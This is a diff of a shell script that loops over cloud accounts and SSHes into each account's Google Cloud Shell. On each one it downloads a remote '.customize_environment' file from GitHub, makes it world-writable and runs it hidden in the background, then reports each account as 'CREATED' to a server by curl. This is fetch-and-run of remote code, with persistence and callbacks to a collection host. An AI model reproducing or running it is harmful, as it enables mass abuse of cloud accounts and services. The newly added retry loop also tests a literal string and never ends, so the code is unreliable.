@@ -50,10 +50,15 @@ do
 
         echo $new 'ok!'
 
+        commandOK='false'
+
         command="[ ! -e '.customize_environment' ] && ( wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; sudo chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & )"
 
-        sudo gcloud cloud-shell ssh --account=$new --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet
-
+        while [ commandOK != 'true' ]
+        do
+          sudo gcloud cloud-shell ssh --account=$new --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet && commandOK='true'
+        done
+        
         url=$ip'/send_status.php?account='$new'&status=CREATED&owner=root'
         curl $url
 
